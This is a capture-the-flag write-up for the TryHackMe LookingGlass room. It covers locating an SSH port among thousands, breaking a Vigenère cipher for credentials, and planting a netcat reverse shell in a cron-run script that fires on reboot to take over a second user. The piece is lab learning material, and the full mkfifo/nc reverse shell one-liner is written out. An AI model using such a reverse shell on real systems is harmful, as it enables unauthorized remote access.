---
title: LookingGlass
layout: post
author: Bit Criminals Team
date: 2021-06-03 17:02:00 +0530
type: Pentesting
difficulty: Medium
prompt: https://tryhackme.com/room/lookingglass
---

First, we ran the nmap scan and were amazed to see  thousands of ssh ports in the range of 9000-13999.When I opened a random port say 12000 in my box the response LOWER came while for 
13000 the response HIGHER came.And this response was random for everyone.After a few discussions we understood that the port we have to locate must be in between the ports giving HIGHER and 
LOWER response.HIGHER and LOWER were references to the next port we need to connect. So if we were to receive the message higher, we would actually connect to a lower port.
Now, you can always do this with a bash script but none of us are good at bash so we manually located the ssh port by hit and trial with the command

ssh <boxip> -p <PORT> 

and then eliminating the PORTs 100s at a time at first,then I found that 12300 gave lower and 12400 gave higher and thus my port was in between this.So,I
started eliminating 10s of port a time and finally I found my port which was 12363 in mycase.

![](/images/Dr.DONN4/mirror1.png)

So,we found a poem first I thought it to be a substitution cipher but it was not.It was a vigenere cipher.

then, we used this online site to bruteforce the cipher key https://www.boxentriq.com/code-breaking/vigenere-cipher. And, then used the key to get the secret.
And, we get the username and password for ssh login.

Then, we got into the jabberwock user and there we found the user flag but mirrored.In this box we found a .sh file and on sudo -l we found a /sbin/reboot Path.
Then, we got into the /etc/crontab file to see that that he .sh script is actually ran by another user named tweedledum.After, few searching and discussions we understood that 
the bash file in ran whenever the system is reboot.So,basically if we give a reverse shell into the bash file and then,listen it in our local port and then, reboot the jabberwock machine we may found the 
tweedledum user.

we used the rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f  reverse shell and changed the ip and the port and then ran sudo reboot.After a few minutes of wait we got the tweedledum 
machine.

![](/images/Dr.DONN4/mirror2.png)

Into the tweedledum user we found a hash in humptydumpty.txt file.

![](/images/Dr.DONN4/mirror3.png) 
